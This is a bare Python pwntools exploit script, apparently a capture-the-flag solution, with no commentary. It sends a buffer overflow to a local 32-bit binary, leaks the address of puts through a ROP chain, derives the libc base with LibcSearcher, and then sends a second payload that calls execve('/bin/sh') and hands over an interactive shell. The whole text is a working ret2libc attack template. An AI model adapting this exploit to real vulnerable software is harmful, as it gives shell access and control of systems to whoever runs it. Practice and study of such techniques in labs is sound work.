from pwn import *
from LibcSearcher import LibcSearcher
context(log_level = 'debug')
p = process('./pwn')
e = ELF('./pwn')
puts_plt = e.plt['puts']
puts_got = e.got['puts']
foo_addr = 0x0804859F
p.recv()
payload1 = flat(['a' * 0x20, puts_plt, foo_addr, puts_got])
p.sendline(payload1)
length=len(payload1)
puts_addr = u32(p.recv()[length+1:length+5])
print hex(puts_addr)
libc = LibcSearcher('puts', puts_addr)
libcbase = puts_addr - libc.dump('puts')
print hex(libcbase)
system_addr = libcbase + libc.dump('execve')
binsh_addr = libcbase + libc.dump('str_bin_sh')
p.sendline(flat(['a' * 0x20, system_addr, 'b'*4, binsh_addr, 0, 0]))
p.interactive()
